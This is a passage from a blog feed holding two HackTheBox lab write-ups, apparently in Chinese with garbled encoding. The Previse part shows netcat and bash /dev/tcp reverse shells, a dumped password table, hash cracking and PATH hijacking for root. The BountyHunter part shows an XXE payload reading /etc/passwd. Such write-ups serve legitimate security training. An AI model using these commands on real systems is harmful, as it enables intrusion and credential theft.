class="line"></span><br></pre></td></tr></table></figure><p><code>ncåå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.10.17.216 6666</span><br></pre></td></tr></table></figure><img src="/2021/08/16/HTB-Previse/image-20210816173943815.png" class><p><code>kaliæ¥åˆ°shellï¼Œå¾—åˆ°çš„shelléäº¤äº’ï¼Œä¸èƒ½ç™»å…¥mysql</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 6666                                                                                                               1 â¨¯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.11.104] 35844</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>å‡çº§äº¤äº’shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@previse:/var/www/html$ </span><br><span class="line"></span><br><span class="line">www-data@previse:/var/www/html$</span><br></pre></td></tr></table></figure><h2 id="0x08-ç™»å…¥mysql"><a href="#0x08-ç™»å…¥mysql" class="headerlink" title="0x08.ç™»å…¥mysql"></a>0x08.ç™»å…¥mysql</h2><p><code>è·å–m4lwhereå¯†ç md5å€¼</code></p><blockquote><p>$1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -uroot -p</span><br><span class="line">mysql -uroot -p</span><br><span class="line">Enter password: mySQL_p@ssw0rd!:)</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5810</span><br><span class="line">Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2021, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show databases;</span></span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| previse            |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use previse;</span></span><br><span class="line">use previse;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show tables;</span></span><br><span class="line">show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_previse |</span><br><span class="line">+-------------------+</span><br><span class="line">| accounts          |</span><br><span class="line">| files             |</span><br><span class="line">+-------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> desc accounts;</span></span><br><span class="line">desc accounts;</span><br><span class="line">+------------+--------------+------+-----+-------------------+----------------+</span><br><span class="line">| Field      | Type         | Null | Key | Default           | Extra          |</span><br><span class="line">+------------+--------------+------+-----+-------------------+----------------+</span><br><span class="line">| id         | int(11)      | NO   | PRI | NULL              | auto_increment |</span><br><span class="line">| username   | varchar(50)  | NO   | UNI | NULL              |                |</span><br><span class="line">| password   | varchar(255) | NO   |     | NULL              |                |</span><br><span class="line">| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |</span><br><span class="line">+------------+--------------+------+-----+-------------------+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from accounts;</span></span><br><span class="line">select * from accounts;</span><br><span class="line">+----+----------+------------------------------------+---------------------+</span><br><span class="line">| id | username | password                           | created_at          |</span><br><span class="line">+----+----------+------------------------------------+---------------------+</span><br><span class="line">|  1 | m4lwhere | $1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |</span><br><span class="line">|  2 | admin    | $1$ğŸ§‚llol$uXqzPW6SXUONt.AIOBqLy. | 2021-08-16 09:11:44 |</span><br><span class="line">|  3 | simon    | $1$ğŸ§‚llol$XiMVTMY58ITU/9mYPenku0 | 2021-08-16 09:13:39 |</span><br><span class="line">|  4 | newguy   | $1$ğŸ§‚llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-16 10:42:19 |</span><br><span class="line">|  5 | jonny    | $1$ğŸ§‚llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-16 10:44:39 |</span><br><span class="line">+----+----------+------------------------------------+---------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p><code>johnç ´è§£hashå€¼</code></p><blockquote><p>ilovecody112235!</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/Previse]</span><br><span class="line">â””â”€# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt userhash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">ilovecody112235! (?)</span><br><span class="line">1g 0:00:05:50 DONE (2021-08-16 07:03) 0.002855g/s 21171p/s 21171c/s 21171C/s ilovecodydean..ilovecody..</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/Previse]</span><br><span class="line">â””â”€# cat userhash   </span><br><span class="line"><span class="meta">$</span><span class="bash">1$ğŸ§‚llol<span class="variable">$DQpmdvnb7EeuO6UaqRItf</span>.</span></span><br><span class="line">                                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/Previse]</span><br><span class="line">â””â”€# </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x09-sshç™»å…¥"><a href="#0x09-sshç™»å…¥" class="headerlink" title="0x09.sshç™»å…¥"></a>0x09.sshç™»å…¥</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/Previse]</span><br><span class="line">â””â”€# ssh m4lwhere@10.10.11.104</span><br><span class="line">m4lwhere@10.10.11.104&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Aug 16 11:15:27 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.1               Processes:           241</span><br><span class="line">  Usage of /:   49.4% of 4.85GB   Users logged in:     0</span><br><span class="line">  Memory usage: 26%               IP address for eth0: 10.10.11.104</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5</span><br><span class="line">m4lwhere@previse:~$ pwd</span><br><span class="line">/home/m4lwhere</span><br><span class="line">m4lwhere@previse:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">m4lwhere@previse:~$ cat user.txt </span><br><span class="line">********************************</span><br><span class="line">m4lwhere@previse:~$ </span><br></pre></td></tr></table></figure><h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>sudo -lææƒ</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;htb&#x2F;Previse]</span><br><span class="line">â””â”€# ssh m4lwhere@10.10.11.104</span><br><span class="line">m4lwhere@10.10.11.104&#39;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU&#x2F;Linux 4.15.0-151-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Aug 16 12:06:54 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           174</span><br><span class="line">  Usage of &#x2F;:   49.4% of 4.85GB   Users logged in:     0</span><br><span class="line">  Memory usage: 20%               IP address for eth0: 10.10.11.104</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5</span><br><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password for m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) &#x2F;opt&#x2F;scripts&#x2F;access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹/opt/scripts/access_backup.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is configured to run with cron, added to sudo so I can run as needed - we<span class="string">&#x27;ll fix it later when there&#x27;</span>s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz</span><br><span class="line">m4lwhere@previse:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>åˆ©ç”¨gzipè·¯å¾„æ»¥ç”¨æ„å»ºpayload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">m4lwhere@previse:~$ cd /tmp</span><br><span class="line">m4lwhere@previse:/tmp$ ls</span><br><span class="line">systemd-private-d085308c77194968bd2248c5047e9e7d-apache2.service-SHI4Vf</span><br><span class="line">systemd-private-d085308c77194968bd2248c5047e9e7d-systemd-resolved.service-c4hkjA</span><br><span class="line">systemd-private-d085308c77194968bd2248c5047e9e7d-systemd-timesyncd.service-oovQQq</span><br><span class="line">vmware-root_904-2697008433</span><br><span class="line">m4lwhere@previse:/tmp$ echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">m4lwhere@previse:/tmp$ vim gzip</span><br><span class="line">m4lwhere@previse:/tmp$ cat gzip</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.17.216/8888 0&gt;&amp;1</span><br><span class="line">m4lwhere@previse:/tmp$ chmod +x gzip </span><br><span class="line">m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH</span><br><span class="line">m4lwhere@previse:/tmp$ echo $PATH</span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>åå¼¹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.11.104] 51322</span><br><span class="line">root@previse:/tmp# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@previse:/tmp# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@previse:~# cd /root</span><br><span class="line">cd /root</span><br><span class="line">root@previse:/root# ls</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@previse:/root# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">************************</span><br><span class="line">root@previse:/root# </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/08/16/HTB-Previse/image-20210816113010834.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-BountyHunter</title>
    <link href="https://lunamoore.github.io/2021/08/15/HTB-BountyHunter/"/>
    <id>https://lunamoore.github.io/2021/08/15/HTB-BountyHunter/</id>
    <published>2021-08-15T12:09:34.000Z</published>
    <updated>2021-08-15T12:20:22.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/08/15/HTB-BountyHunter/image-20210814200854065.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°åªå¼€æ”¾äº†22ä¸80ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/BountyHunter]</span><br><span class="line">â””â”€# nmap -sC -sV -sT 10.10.11.100 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 06:25 EDT</span><br><span class="line">Nmap scan report for 10.10.11.100</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)</span><br><span class="line">|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)</span><br><span class="line">|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Bounty Hunters</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.01 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>è¿™æ˜¯å¯»æ‰¾hackerçš„å¹³å°ï¼Œå¹¶æç¤ºä½¿ç”¨burp</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814220805615.png" class><p><code>æ‰‹åŠ¨çˆ¬è™«ä¸€ä¸‹å‘ç°ä¸€ä¸ªæäº¤é¢æ¿</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814221019084.png" class><h2 id="0x03-åˆ—ä¸€ä¸‹ç›®å½•"><a href="#0x03-åˆ—ä¸€ä¸‹ç›®å½•" class="headerlink" title="0x03.åˆ—ä¸€ä¸‹ç›®å½•"></a>0x03.åˆ—ä¸€ä¸‹ç›®å½•</h2><p><code>å‘ç°db.phpï¼Œæ¨æµ‹è¿™æ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/vpn]</span><br><span class="line">â””â”€# gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.11.100</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/15 01:21:23 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]</span><br><span class="line">/index.php            (Status: 200) [Size: 25169]                                   </span><br><span class="line">/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]   </span><br><span class="line">/portal.php           (Status: 200) [Size: 125]                                     </span><br><span class="line">/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]      </span><br><span class="line">/db.php               (Status: 200) [Size: 0]                                       </span><br><span class="line">/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]       </span><br><span class="line">/server-status        (Status: 403) [Size: 277]                                     </span><br><span class="line">                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/15 02:15:09 Finished</span><br><span class="line">===============================================================</span><br><span class="line">                                                        </span><br></pre></td></tr></table></figure><p><code>ä½†æ˜¯çœ‹ä¸åˆ°å†…å®¹</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210815134247833.png" class><h2 id="0x04-burpæŠ“åŒ…"><a href="#0x04-burpæŠ“åŒ…" class="headerlink" title="0x04.burpæŠ“åŒ…"></a>0x04.burpæŠ“åŒ…</h2><p><code>ä¸»é¡µæŠ“åŒ…æ²¡ä»€ä¹ˆå‘ç°</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814221815307.png" class><p><code>æŠ“ä¸€ä¸‹log_submit.phpï¼Œå¯ä»¥å‘ç°ä¼ è¾“çš„æ•°æ®è¢«base64ç¼–ç äº†</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814222058192.png" class><p><code>è§£ç å‘ç°ä½¿ç”¨äº†xmlè¿›è¡Œä¼ è¾“</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814222213318.png" class><h2 id="0x05-xmlæ³¨å…¥"><a href="#0x05-xmlæ³¨å…¥" class="headerlink" title="0x05.xmlæ³¨å…¥"></a>0x05.xmlæ³¨å…¥</h2><p><code>payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE demo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">        &lt;bugreport&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">        &lt;cwe&gt;demo&lt;/cwe&gt;</span><br><span class="line">        &lt;cvss&gt;demo&lt;/cvss&gt;</span><br><span class="line">        &lt;reward&gt;demo&lt;/reward&gt;</span><br><span class="line">        &lt;/bugreport&gt;</span><br></pre></td></tr></table></figure><p><code>base64ç¼–ç </code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPl0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+ZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M+CgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+</span><br></pre></td></tr></table></figure><p><code>urlç¼–ç </code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPl0%</span><span class="bash">2bCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgoJCTxjd2U%2bZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M%2bCgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ%2bCgkJPC9idWdyZXBvcnQ%2b</span></span><br></pre></td></tr></table></figure><p><code>æˆåŠŸåˆ©ç”¨ï¼Œå¹¶å‘ç°developmentç”¨æˆ·</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210815132443349.png" 